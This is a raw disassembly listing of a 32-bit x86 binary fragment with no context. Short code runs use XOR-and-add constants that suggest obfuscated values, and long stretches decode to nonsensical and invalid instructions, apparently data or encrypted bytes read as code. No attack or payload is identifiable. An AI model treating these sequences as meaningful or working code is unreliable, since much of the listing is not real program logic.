  40c3de:	shl    bh,cl
  40c3e0:	lock dec edi
  40c3e2:	xchg   ecx,eax
  40c3e3:	pop    edx
  40c3e4:	ret    
  40c3e5:	and    dh,BYTE PTR [esi-0x75]
  40c3e8:	inc    ebp
  40c3e9:	cld    
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shr    edx,cl
  40c447:	scas   eax,DWORD PTR es:[edi]
  40c448:	es sahf 
  40c44a:	adc    al,0x82
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	dec    esp
  40c453:	fs inc esi
  40c455:	xchg   BYTE PTR [edi-0x60],cl
  40c458:	icebp  
  40c459:	lahf   
  40c45a:	inc    eax
  40c45b:	push   esi
  40c45c:	int3   
  40c45d:	retf   0x2d18
  40c460:	inc    esp
  40c461:	lods   al,BYTE PTR ds:[esi]
  40c462:	cmp    eax,0x9ab16edf
  40c467:	cmp    al,0xea
  40c469:	jmp    DWORD PTR [edi+0x4ad3f406]
  40c46f:	(bad)  
  40c470:	or     eax,0xb7017dff
  40c475:	and    BYTE PTR [ebx+ecx*2],al
  40c478:	call   0x4a20:0xf1168587
  40c47f:	add    eax,0xe400f61b
  40c484:	fwait
  40c485:	out    0x2b,al
  40c487:	leave  
  40c488:	sbb    dl,BYTE PTR [ebp+0x26]
  40c48b:	sub    al,0xc6
  40c48d:	mov    edi,0xe1acc883
  40c492:	jmp    0x8ed5:0x51d89fbf
  40c499:	or     cl,dl
  40c49b:	pusha  
  40c49c:	and    ch,cl
  40c49e:	mov    bl,0xbc
  40c4a0:	ret    0x45a0
  40c4a3:	shl    BYTE PTR [esi-0x6f0e4cac],1
  40c4a9:	stc    
  40c4aa:	fdivr  QWORD PTR [esp+edi*2]
  40c4ad:	mov    cl,0x3c
  40c4af:	stos   BYTE PTR es:[edi],al
  40c4b0:	inc    esp
  40c4b1:	xchg   BYTE PTR [eax],bl
  40c4b3:	ret    
  40c4b4:	fisubr DWORD PTR [edi-0x3c]
  40c4b7:	lahf   
  40c4b8:	xlat   BYTE PTR ds:[ebx]
  40c4b9:	mov    bl,ch
  40c4bb:	fs xchg edx,eax
  40c4bd:	inc    ebx
  40c4be:	push   es
  40c4bf:	mov    al,ds:0xae8e5c23
  40c4c4:	bound  esi,QWORD PTR [edi-0x24]
  40c4c7:	pop    ss
  40c4c8:	outs   dx,BYTE PTR ds:[esi]
  40c4c9:	lock mov edi,0xc83e89d0
  40c4cf:	ins    DWORD PTR es:[edi],dx
  40c4d0:	jno    0x40c467
  40c4d2:	outs   dx,BYTE PTR ds:[esi]
  40c4d3:	mov    esp,DWORD PTR [ecx-0x24]
  40c4d6:	dec    eax
  40c4d7:	fwait
  40c4d8:	test   BYTE PTR [ebp+0x2b],bh
  40c4db:	aas    
  40c4dc:	and    dl,BYTE PTR [eax+0xc]
  40c4df:	dec    ebp
  40c4e0:	push   edx
  40c4e1:	jg     0x40c466
  40c4e3:	jne    0x40c522
  40c4e5:	mov    ds:0x94bc24cb,eax
  40c4ea:	and    al,0x3
  40c4ec:	aaa    
  40c4ed:	mov    ecx,0x617ec97b
  40c4f2:	push   edx
  40c4f3:	into   
  40c4f4:	fs push ss
  40c4f6:	adc    BYTE PTR [ecx-0x15],ah
  40c4f9:	mov    ebp,0x83102a09
  40c4fe:	mov    BYTE PTR [esp+esi*8],0x65
  40c502:	xchg   BYTE PTR [esi-0x2a],dh
  40c505:	and    eax,0xacec873b
  40c50a:	mov    dh,0x24
  40c50c:	inc    edi
  40c50d:	clc    
  40c50e:	test   DWORD PTR [ebx+0x3e],edi
  40c511:	pusha  
  40c512:	js     0x40c4da
  40c514:	cmp    bh,BYTE PTR [ebp+0x1d18f67c]
  40c51a:	inc    edx
  40c51b:	jbe    0x40c524
  40c51d:	in     eax,0x37
  40c51f:	jmp    0x4b8075a
  40c524:	jp     0x40c579
  40c526:	aam    0x45
  40c528:	(bad)  
  40c529:	out    dx,al
  40c52a:	add    eax,0xb0bc4267
  40c52f:	fld    QWORD PTR [ebp+0x4]
  40c532:	popf   
  40c533:	call   0x4907:0x26020e82
  40c53a:	arpl   WORD PTR ds:0xb7dabde5,cx
  40c540:	adc    dh,ah
  40c542:	push   0x1
  40c544:	mov    eax,DWORD PTR [ecx+ecx*2+0x6a83fe0d]
  40c54b:	imul   ebx,DWORD PTR [esi],0xd93d005b
  40c551:	bound  ebp,QWORD PTR [ecx-0x78]
  40c554:	jne    0x40c520
  40c556:	jmp    0x40c5cf
  40c558:	xchg   ebx,eax
  40c559:	jl     0x40c500
  40c55b:	fwait
  40c55c:	sete   BYTE PTR [edx-0x7c]
  40c560:	shl    DWORD PTR [edx],1
  40c562:	jle    0x40c5c9
  40c564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c565:	adc    eax,0xf77f77d3
  40c56a:	cmc    
  40c56b:	lods   al,BYTE PTR ds:[esi]
  40c56c:	and    eax,0xfe4c719
  40c571:	mov    al,0x95
  40c573:	lods   al,BYTE PTR ds:[esi]
  40c574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c575:	lahf   
  40c576:	out    0x79,al
  40c578:	sub    al,0x56
  40c57a:	scas   al,BYTE PTR es:[edi]
  40c57b:	push   ds
  40c57c:	sti    
  40c57d:	ins    DWORD PTR es:[edi],dx
  40c57e:	int    0xd3
  40c580:	std    
  40c581:	gs scas eax,DWORD PTR es:[edi]
  40c583:	add    edx,DWORD PTR [ebp-0x79c2014f]
  40c589:	cli    
  40c58a:	mov    esi,0xf3e0bf1f
  40c58f:	pop    edx
  40c590:	xchg   esi,eax
  40c591:	pop    es
  40c592:	jae    0x40c5c9
  40c594:	je     0x40c5ba
  40c596:	cvtdq2ps xmm6,XMMWORD PTR [ebp+0x409c4a73]
  40c59d:	in     al,dx
  40c59e:	lds    edi,FWORD PTR [edx+0x79]
  40c5a1:	or     eax,0xa4e00da8
  40c5a6:	sub    eax,0xca7f9149
  40c5ab:	daa    
  40c5ac:	push   0xffffff9d
  40c5ae:	fadd   DWORD PTR [edx-0x76]
  40c5b1:	push   es
  40c5b2:	pop    ebx
  40c5b3:	mov    ds:0x69887941,eax
  40c5b8:	clc    
  40c5b9:	jb     0x40c5ca
  40c5bb:	xchg   ebp,eax
  40c5bc:	(bad)  
  40c5bd:	xor    cl,cl
  40c5bf:	mov    ds:0x1a6feb29,al
  40c5c4:	ins    BYTE PTR es:[edi],dx
  40c5c5:	in     al,0xf6
  40c5c7:	outs   dx,BYTE PTR ds:[esi]
  40c5c8:	nop
  40c5c9:	std    
  40c5ca:	scas   eax,DWORD PTR es:[edi]
  40c5cb:	ret    
  40c5cc:	jnp    0x40c591
  40c5ce:	xchg   esp,eax
  40c5cf:	dec    ebp
  40c5d0:	mov    eax,0x3072a855
  40c5d5:	rcl    BYTE PTR [eax-0x6170e13c],1
  40c5db:	add    ebx,edi
  40c5dd:	push   cs
  40c5de:	mov    al,ds:0x759377e9
  40c5e3:	int    0x52
  40c5e5:	jp     0x40c64b
  40c5e7:	mov    ds:0xdd658b2f,eax
  40c5ec:	cmp    al,0xc7
  40c5ee:	push   ebx
  40c5ef:	pop    edx
  40c5f1:	(bad)  
  40c5f2:	pop    ss
  40c5f3:	or     eax,0x7f9a500c
  40c5f8:	mov    al,0x72
  40c5fa:	mov    al,0x77
  40c5fc:	pavgb  mm5,QWORD PTR [ecx]
  40c5ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c600:	pusha  
  40c601:	mov    dh,0x17
  40c603:	jno    0x40c5a3
  40c605:	repz push ds
  40c607:	dec    esp
  40c608:	loop   0x40c5d8
  40c60a:	and    DWORD PTR [ecx],eax
  40c60c:	sub    eax,0x6a20fcaf
  40c611:	jmp    0x40c5ba
  40c613:	enter  0x5c02,0xd9
  40c617:	rol    DWORD PTR [esi+esi*2+0x71],cl
  40c61b:	push   0x88068e3b
  40c620:	or     eax,0x6bcdd73f
  40c625:	sbb    dh,BYTE PTR [eax+0x1b272044]
  40c62b:	(bad)  
  40c62c:	retf   
  40c62d:	or     DWORD PTR [edx+0x1],edi
  40c630:	mov    ebx,0x179d814a
  40c635:	mov    bh,0x28
  40c637:	dec    ebp
  40c638:	push   0xffffffb9
  40c63a:	retf   
  40c63b:	or     al,0xad
  40c63d:	in     eax,dx
  40c63e:	or     dh,0x2f
  40c641:	xor    edi,eax
  40c643:	cmp    DWORD PTR [esi],ebp
  40c645:	stos   BYTE PTR es:[edi],al
  40c646:	or     bl,BYTE PTR [eax+0x26d6a7f1]
  40c64c:	retf   0x9263
  40c64f:	popf   
  40c650:	nop
  40c651:	sti    
  40c652:	ja     0x40c652
  40c654:	(bad)  [eax-0x67]
  40c657:	or     ch,ch
  40c659:	xor    BYTE PTR [esi+esi*4+0x33],bl
  40c65d:	daa    
  40c65e:	stos   DWORD PTR es:[edi],eax
  40c65f:	clc    
  40c660:	imul   edx,DWORD PTR [edx+0x9d0cd38],0xf
  40c667:	outs   dx,DWORD PTR ds:[esi]
  40c668:	jbe    0x40c6ca
  40c66a:	xor    DWORD PTR [esi+0x56],edi
  40c66d:	push   edi
  40c66e:	ja     0x40c686
  40c670:	jno    0x40c65d
  40c672:	xchg   ebp,eax
  40c673:	and    ch,cl
  40c675:	mov    ebp,0xd7cf9770
  40c67a:	shl    bl,1
  40c67c:	mov    ah,0x90
  40c67e:	mov    ch,0xac
  40c680:	adc    dl,BYTE PTR [eax+edx*4+0xe]
  40c684:	pop    eax
  40c685:	sbb    DWORD PTR [eax-0x69],edx
  40c688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c689:	call   0xf660:0xb654d910
  40c690:	add    BYTE PTR [bx+di],dl
  40c693:	repnz mov eax,0xbe171508
  40c699:	fwait
  40c69a:	jb     0x40c6ce
  40c69c:	add    BYTE PTR [ebx],al
  40c69e:	(bad)  
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0x16429ac1],dl
  40c6de:	xchg   esi,eax
  40c6df:	dec    esi
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	cs fdivp st(7),st
  40c6eb:	jg     0x40c6e1
  40c6ed:	ds inc ebx
  40c6ef:	aaa    
  40c6f0:	loope  0x40c6d2
  40c6f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6f3:	jp     0x40c736
  40c6f5:	in     al,dx
  40c6f6:	test   eax,0xe4b740fd
  40c6fb:	leave  
  40c6fc:	dec    edx
  40c6fd:	sub    ebp,esi
  40c6ff:	add    eax,0x852c9268
  40c704:	xlat   BYTE PTR ds:[ebx]
  40c705:	inc    ebx
  40c706:	xchg   esp,eax
  40c707:	adc    al,dl
  40c709:	cmp    dl,BYTE PTR [ecx]
  40c70b:	jge    0x40c691
  40c70d:	xchg   ebp,eax
  40c70e:	sub    BYTE PTR gs:[edi],al
  40c711:	push   ebx
  40c712:	ins    DWORD PTR es:[edi],dx
  40c713:	add    BYTE PTR [esi+eax*4-0x5491c3bf],0x7a
  40c71b:	jmp    0x4e2a:0x4b1c5c0a
  40c722:	or     al,0xbc
  40c724:	sub    esi,ecx
  40c726:	aas    
  40c727:	popf   
  40c728:	scas   eax,DWORD PTR es:[edi]
  40c729:	jnp    0x40c6cf
  40c72b:	out    dx,al
  40c72c:	cli    
  40c72d:	imul   ebx,esi,0x62eb022c
  40c733:	add    DWORD PTR [ecx],edx
  40c735:	cmc    
  40c736:	lods   al,BYTE PTR ds:[esi]
  40c737:	icebp  
  40c738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c739:	jg     0x40c757
  40c73b:	xor    DWORD PTR [ecx+0x2e0d4735],0xffffff8d
  40c742:	repz pusha 
  40c744:	test   BYTE PTR [eax+0x70],bh
  40c747:	test   al,0xa9
  40c749:	push   0xffffffa6
  40c74b:	jmp    0x16cf62a8
  40c750:	push   edi
  40c751:	push   esi
  40c752:	aas    
  40c753:	xchg   esi,eax
  40c754:	dec    ebp
  40c755:	hlt    
  40c756:	outs   dx,BYTE PTR ds:[esi]
  40c757:	dec    esp
  40c758:	push   edx
  40c759:	push   ebp
  40c75a:	xchg   edi,eax
  40c75b:	pop    ecx
  40c75c:	mov    eax,0x7be7804d
  40c761:	add    cl,0x95
  40c764:	cdq    
  40c765:	sbb    eax,0x39d5fa52
  40c76a:	jns    0x40c768
  40c76c:	shl    BYTE PTR [edx+0x2ff2d507],0x48
  40c773:	cld    
  40c774:	sbb    BYTE PTR [ecx+0x64ad3f56],dh
  40c77a:	add    eax,0x19b8cf17
  40c77f:	out    dx,eax
  40c780:	loope  0x40c740
  40c782:	ss call 0xa1b2da8e
  40c788:	dec    edi
  40c789:	mov    al,BYTE PTR [eax-0x2b]
  40c78c:	je     0x40c720
  40c78e:	sbb    BYTE PTR [ebx+0x0],ah
  40c791:	test   al,0x8d
  40c793:	bt     DWORD PTR [esi+0x3],0x39
  40c798:	dec    edx
  40c799:	pop    es
  40c79a:	aaa    
  40c79b:	pusha  
  40c79c:	push   ebp
  40c79d:	neg    BYTE PTR [eax+0x7359d169]
  40c7a3:	and    dh,BYTE PTR [eax]
  40c7a5:	mov    ebp,0x10ef6132
  40c7aa:	cmp    eax,0x33cd089b
  40c7af:	xor    eax,ecx
  40c7b1:	lods   al,BYTE PTR ds:[esi]
  40c7b2:	or     BYTE PTR [edx],0x27
  40c7b5:	repz pushf 
  40c7b7:	add    bh,ah
  40c7b9:	clc    
  40c7ba:	adc    edi,ecx
  40c7bc:	into   
  40c7bd:	aas    
  40c7be:	arpl   WORD PTR [edi+ecx*1],di
  40c7c1:	or     BYTE PTR [eax+ebp*4-0x60f670c5],ch
  40c7c8:	mov    DWORD PTR [edi],ecx
  40c7ca:	push   DWORD PTR [ebp-0x4f89eaa7]
  40c7d0:	pop    es
  40c7d1:	(bad)  [edx+0x68]
  40c7d4:	jecxz  0x40c7aa
  40c7d6:	data16 and dl,BYTE PTR gs:[ebx-0x54]
  40c7db:	iret   
  40c7dc:	cmp    ebp,0x30
  40c7df:	aad    0xe6
  40c7e1:	pop    ds
  40c7e2:	sbb    ebp,DWORD PTR [edx+0x63]
  40c7e5:	mov    esi,0x84df2565
  40c7ea:	adc    al,BYTE PTR [esp+edx*4+0x73e3902a]
  40c7f1:	pop    edi
  40c7f2:	shr    DWORD PTR [edx-0x2c],1
  40c7f5:	jmp    0x40c859
  40c7f7:	jmp    0x40c826
  40c7f9:	das    
  40c7fa:	repnz fld DWORD PTR [esi-0x47]
  40c7fe:	xor    eax,0x81bba251
  40c803:	jae    0x40c79d
  40c805:	adc    DWORD PTR cs:[eax-0x41],edi
  40c809:	mov    edx,0xf799d8bc
  40c80e:	adc    DWORD PTR [esi-0xc118b9b],ebx
  40c814:	pusha  
  40c815:	mov    al,0xb6
  40c817:	jmp    0x2aed:0xa52da21c
  40c81e:	xor    BYTE PTR [ecx],dh
  40c820:	pop    ebx
  40c821:	and    ebp,DWORD PTR [ebx-0x2ce98a9b]
  40c827:	fcomp  QWORD PTR ds:0x92b31780
  40c82d:	jmp    0xf4df:0x41c2cf87
  40c834:	fistp  WORD PTR [edx+0x70d0f728]
  40c83a:	jne    0x40c7f2
  40c83c:	lock jbe 0x40c851
  40c83f:	push   eax
  40c840:	aam    0x54
  40c842:	gs inc esp
  40c844:	les    edi,FWORD PTR [eax+ebx*8-0x6e8203ba]
  40c84b:	jne    0x40c82b
  40c84d:	(bad)  
  40c84e:	sub    BYTE PTR [esi],al
  40c850:	sbb    dl,BYTE PTR [eax]
  40c852:	mov    al,ds:0x6d9cdaf0
  40c857:	ret    0xe90d
  40c85a:	cdq    
  40c85b:	imul   eax,DWORD PTR [esi],0xa259595f
  40c861:	or     eax,0xede49aa9
  40c866:	(bad)  
  40c867:	xchg   ecx,eax
  40c868:	sbb    DWORD PTR [ebp+0x7b8f0530],esi
  40c86e:	aam    0xc1
  40c870:	sbb    BYTE PTR [esi+0x4f270fc5],al
  40c876:	mov    edi,0xcedee1aa
  40c87b:	xchg   ebx,eax
  40c87c:	(bad)  
  40c87e:	mov    DWORD PTR [eax+ebp*8-0x30],ebx
  40c882:	dec    eax
  40c883:	mov    ebp,0xa0472d6c
  40c888:	test   DWORD PTR [ebx],edx
  40c88a:	fstp   DWORD PTR [si]
  40c88d:	jbe    0x40c818
  40c88f:	inc    esp
  40c890:	sub    eax,0x73847952
  40c895:	aaa    
  40c896:	push   0xeeb2027c
  40c89b:	test   dh,dl
  40c89d:	enter  0x58dc,0x6c
  40c8a1:	xchg   esi,eax
  40c8a2:	or     ebx,DWORD PTR [edi-0xf]
  40c8a5:	xchg   esi,eax
  40c8a6:	mov    al,0xa2
  40c8a8:	xor    eax,0x16e8847d
  40c8ad:	loope  0x40c8d6
  40c8af:	out    0xc6,al
  40c8b1:	inc    eax
  40c8b2:	std    
  40c8b3:	lahf   
  40c8b4:	push   edi
  40c8b5:	or     al,0xb1
  40c8b7:	inc    edi
  40c8b8:	sti    
  40c8b9:	mov    ds:0xb06539d2,eax
  40c8be:	push   ebx
  40c8bf:	lods   al,BYTE PTR ds:[esi]
  40c8c0:	mov    al,ds:0xa34a1eba
  40c8c5:	sbb    esp,esp
  40c8c7:	cmp    ebx,ecx
  40c8c9:	mov    DWORD PTR [ebx-0x2c484579],esi
  40c8cf:	xor    al,0x81
  40c8d1:	push   ecx
  40c8d2:	mov    dh,0xea
  40c8d4:	lock jg 0x40c8a0
  40c8d7:	lea    esi,[esi-0x1f]
  40c8da:	int    0x32
  40c8dc:	xchg   edx,eax
  40c8dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8de:	shr    DWORD PTR [ecx],cl
  40c8e0:	rcl    ah,cl
  40c8e2:	idiv   DWORD PTR gs:[edi+0x71aa7e11]
  40c8e9:	push   cs
  40c8ea:	int3   
  40c8eb:	std    
  40c8ec:	or     cl,BYTE PTR [eax-0x66b16460]
  40c8f2:	addr16 ret 0x73de
  40c8f6:	ins    DWORD PTR es:[edi],dx
  40c8f7:	mov    bh,bh
  40c8f9:	pop    ebp
  40c8fa:	xchg   edx,eax
  40c8fb:	push   eax
  40c8fc:	jmp    0x40c8f3
  40c8fe:	ins    DWORD PTR es:[edi],dx
  40c8ff:	popa   
  40c900:	outs   dx,DWORD PTR ds:[esi]
  40c901:	fdiv   st(7),st
  40c903:	es inc edi
  40c905:	popf   
  40c906:	mov    ah,0xb3
  40c908:	call   0x6d66:0x32f34b98
  40c90f:	mov    esp,DWORD PTR ds:0xdf5f423e
  40c915:	jnp    0x40c8e5
  40c917:	push   ebp
  40c918:	push   cs
  40c919:	das    
  40c91a:	mov    al,BYTE PTR [ebx+0x5941e2a2]
  40c920:	mov    bh,0xe4
  40c922:	sub    ebp,DWORD PTR [esi-0x65]
  40c925:	fsubr  DWORD PTR [ebx-0x36]
  40c928:	jo     0x40c8c4
  40c92a:	jo     0x40c967
  40c92c:	lods   eax,DWORD PTR ds:[esi]
  40c92d:	and    ecx,DWORD PTR [ebx-0x3eccebab]
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [edx-0x67c56ca5],ebx
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	mov    ebx,0xd3426d38
  40c955:	leave  
  40c956:	leave  
  40c957:	sbb    esi,DWORD PTR ss:[ecx-0x5d]
  40c95b:	inc    ecx
  40c95c:	sbb    ch,ah
  40c95e:	mov    cl,0x1b
  40c960:	clc    
  40c961:	cdq    
  40c962:	or     dh,bl
  40c964:	shl    DWORD PTR [esi],1
  40c966:	jnp    0x40c984
  40c968:	out    dx,eax
  40c969:	add    BYTE PTR [ebx],dl
  40c96b:	jp     0x40c9b7
  40c96d:	test   DWORD PTR [ecx+ebp*8],0xed5dfd6f
  40c974:	sbb    bh,BYTE PTR [edi-0x4da3dd6]
  40c97a:	or     dl,BYTE PTR [edx+0x2]
  40c97d:	and    esp,esp
  40c97f:	jl     0x40c963
  40c981:	stos   DWORD PTR es:[edi],eax
  40c982:	inc    DWORD PTR [edi+0x30c2783c]
  40c988:	fdivr  DWORD PTR [esp+edx*1]
  40c98b:	les    esi,FWORD PTR [eax-0x6a]
  40c98e:	test   al,0x60
  40c990:	mov    edi,0x23067364
  40c995:	pop    esi
  40c996:	jmp    0xc516:0x5d628467
  40c99d:	fisubr WORD PTR [ebp-0x79]
  40c9a0:	(bad)  ss:[ebp+0x3f]
  40c9a4:	icebp  
  40c9a5:	sub    ch,BYTE PTR [ebx-0x47]
  40c9a8:	dec    esp
  40c9a9:	mov    DWORD PTR [eax+0x42],esi
  40c9ac:	das    
  40c9ad:	and    dl,BYTE PTR [ebx]
  40c9af:	mov    esp,0xccb94438
  40c9b4:	sub    ecx,ebx
  40c9b6:	adc    eax,0xecbf0aa8
  40c9bb:	jo     0x40c97b
  40c9bd:	pop    esi
  40c9be:	jae    0x40c9ca
  40c9c0:	sub    DWORD PTR [edx+0x4255fb3],0x896d7448
  40c9ca:	fldcw  WORD PTR [esi]
  40c9cc:	xlat   BYTE PTR ds:[ebx]
  40c9cd:	cmp    bl,dl
  40c9cf:	lahf   
  40c9d0:	sbb    cl,BYTE PTR [ecx]
  40c9d2:	sub    eax,0x4918b8b8
  40c9d7:	mov    WORD PTR [eax+0x64],ss
  40c9da:	enter  0x6045,0x7
  40c9de:	idiv   BYTE PTR [edx-0x66]
  40c9e1:	inc    ebx
  40c9e2:	iret   
  40c9e3:	ficom  WORD PTR [esi]
  40c9e5:	pop    ds
  40c9e6:	adc    BYTE PTR [esp+ebp*8-0xd],cl
  40c9ea:	sar    BYTE PTR [edi+0x3a],1
  40c9ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9ee:	or     eax,0x5ead8b4f
  40c9f3:	sbb    ah,BYTE PTR [edi]
  40c9f5:	cld    
  40c9f6:	sbb    bh,ah
  40c9f8:	dec    esi
  40c9f9:	repnz sbb DWORD PTR [esi-0x6e],edx
  40c9fd:	push   ecx
  40c9fe:	mov    ds:0x77c3c7ea,eax
  40ca03:	mov    ds:0x6e0cc76,al
  40ca08:	retf   
  40ca09:	leave  
  40ca0a:	loopne 0x40c9fc
  40ca0c:	inc    ecx
  40ca0d:	pop    ss
  40ca0e:	test   cl,bl
  40ca10:	mov    ch,BYTE PTR ds:0x7884d078
  40ca16:	enter  0x7fa1,0x82
  40ca1a:	pop    ecx
  40ca1b:	mov    ch,0xba
  40ca1d:	div    DWORD PTR [esi+0x6d]
  40ca20:	jmp    DWORD PTR [ebx-0x4f4a9fe4]
  40ca26:	cmp    DWORD PTR [edi-0x736974fd],0xf8ad6b7e
  40ca30:	jl     0x40caa9
  40ca32:	sbb    BYTE PTR [ecx],al
  40ca34:	data16 fwait
  40ca36:	jo     0x40ca88
  40ca38:	inc    eax
  40ca39:	jns    0x40ca84
  40ca3b:	xor    esi,ebp
  40ca3d:	adc    al,BYTE PTR ds:0xb70b5f80
  40ca43:	call   0x19b1:0x5b9f1d73
  40ca4a:	jb     0x40ca60
  40ca4c:	daa    
  40ca4d:	cmp    dh,BYTE PTR [ebx-0x4e]
  40ca50:	mov    WORD PTR [ebp+0x6daee6be],ss
  40ca56:	and    esi,edx
  40ca58:	frstor [edx+0x42]
  40ca5b:	test   al,0x87
  40ca5d:	sub    eax,0x69b6666a
  40ca62:	mov    ebx,0x9d23d18c
  40ca67:	je     0x40ca0d
  40ca69:	sbb    eax,0x99e71422
  40ca6e:	jg     0x40cab4
  40ca70:	retf   
  40ca71:	push   0x6d
  40ca73:	cmp    al,0x4d
  40ca75:	leave  
  40ca76:	sub    ebx,DWORD PTR [ecx]
  40ca78:	icebp  
  40ca79:	adc    al,0x3e
  40ca7b:	xchg   edx,eax
  40ca7c:	(bad)  
  40ca7d:	jne    0x40ca22
  40ca7f:	mov    ds:0xcc48dc01,al
  40ca84:	test   al,0xdf
  40ca86:	mov    esi,0xf22d9724
  40ca8b:	stos   DWORD PTR es:[edi],eax
  40ca8c:	aam    0xf
  40ca8e:	jmp    0x2b081f7d
  40ca93:	fstp   DWORD PTR [ecx-0x54]
  40ca96:	test   eax,0x772f8196
  40ca9b:	cmp    al,0x9e
  40ca9d:	stos   BYTE PTR es:[edi],al
  40ca9e:	push   edx
  40ca9f:	pop    esp
  40caa0:	nop
  40caa1:	inc    ebx
  40caa2:	and    ch,BYTE PTR [esp+ebx*2+0x70]
  40caa6:	fdiv   DWORD PTR [esi-0x74a706b9]
  40caac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caad:	ret    0x73f2
  40cab0:	test   DWORD PTR [ebx],esp
  40cab2:	cmc    
  40cab3:	and    dh,ah
  40cab5:	mov    ch,BYTE PTR [edi]
  40cab7:	popf   
  40cab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cab9:	das    
  40caba:	push   eax
  40cabb:	add    DWORD PTR [ebx+0x40],ebx
  40cabe:	mov    edi,0x5219d54b
  40cac3:	mov    eax,ds:0xecdc9267
  40cac8:	dec    esp
  40cac9:	dec    esi
  40caca:	jmp    0x40caaa
  40cacc:	test   DWORD PTR [ecx],ebp
  40cace:	adc    dl,BYTE PTR [eax+esi*8+0x65]
  40cad2:	pushf  
  40cad3:	ds sbb cl,dh
  40cad6:	test   al,0x53
  40cad8:	not    ch
  40cada:	sub    edi,DWORD PTR [esi]
  40cadc:	bound  esp,QWORD PTR [eax+eiz*4-0xe]
  40cae0:	stos   BYTE PTR es:[edi],al
  40cae1:	cmp    eax,DWORD PTR [eax-0x74260d1b]
  40cae7:	popa   
  40cae8:	aas    
  40cae9:	stc    
  40caea:	add    dl,BYTE PTR [ebp+0x2c082207]
  40caf0:	mov    dh,0x72
  40caf2:	push   es
  40caf3:	mov    edi,0xc64479d2
  40caf8:	xor    eax,0xf313b6e3
  40cafd:	jp     0x40ca95
  40caff:	mov    ebp,eax
  40cb01:	push   ds
  40cb02:	mov    edx,0x33a255be
  40cb07:	dec    edx
  40cb08:	add    ah,BYTE PTR [eax]
  40cb0a:	pop    ebx
  40cb0b:	pop    ebx
  40cb0c:	enter  0xcd53,0x30
  40cb10:	imul   esi,DWORD PTR [ebx-0x65642f9d],0xc77ab4c2
  40cb1a:	es aam 0x2a
  40cb1d:	int3   
  40cb1e:	add    al,0xc4
  40cb20:	push   edx
  40cb21:	popa   
  40cb22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb23:	mov    esp,0x3a2f15cd
  40cb28:	lods   al,BYTE PTR ds:[esi]
  40cb29:	pop    ds
  40cb2a:	arpl   WORD PTR [eax+0x30],ax
  40cb2d:	outs   dx,DWORD PTR ds:[esi]
  40cb2e:	jns    0x40cb2f
  40cb30:	out    0x7d,al
  40cb32:	xor    DWORD PTR [ecx+eax*4+0x55],edi
  40cb36:	pusha  
  40cb37:	inc    ecx
  40cb38:	dec    esp
  40cb39:	push   edi
  40cb3a:	cmp    bl,dl
  40cb3c:	sub    al,0x94
  40cb3e:	push   ebx
  40cb3f:	jecxz  0x40cb6b
  40cb41:	xchg   ebx,eax
  40cb42:	leave  
  40cb43:	adc    DWORD PTR [ebx],esp
  40cb45:	popf   
  40cb46:	ficomp WORD PTR [ecx]
  40cb48:	push   edx
  40cb49:	xor    ch,al
  40cb4b:	dec    ecx
  40cb4c:	out    0x3b,al
